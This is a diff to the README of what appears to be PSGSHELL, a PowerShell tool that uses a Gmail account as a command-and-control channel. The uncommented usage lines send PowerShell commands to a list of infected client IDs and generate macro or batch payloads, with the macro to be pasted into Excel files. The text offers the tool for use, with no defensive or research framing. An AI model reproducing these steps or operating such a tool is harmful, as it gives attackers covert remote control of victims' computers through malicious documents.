@@ -11,13 +11,13 @@ All you need to download is the PSGSHELL.psm1 file to start having fun.
 
 You will need gmail account with insecure apps allowed.
 
-#Send-PSGCommand -EmailAddress <test@gmail.com> -Password <password> -CLIENTLIST <11111:232245:432243:> -Command <Powershell V2 Command> 
+Send-PSGCommand -EmailAddress <test@gmail.com> -Password <password> -CLIENTLIST <11111:232245:432243:> -Command <Powershell V2 Command> 
 
 
 Notes: All paramaters required. Client list should be separated by colons
 
 
-#New-PSGPayload -EmailAddress <test@gmail.com> -Password <password> -ClientID <ID For Client> -Type <macro or batch> -OutFile <full path to output>
+New-PSGPayload -EmailAddress <test@gmail.com> -Password <password> -ClientID <ID For Client> -Type <macro or batch> -OutFile <full path to output>
 
 Notes: ClientID should be a unique 6 character string. Macro will need to be copied from output file into excel. Batch script can also be powershell.
 
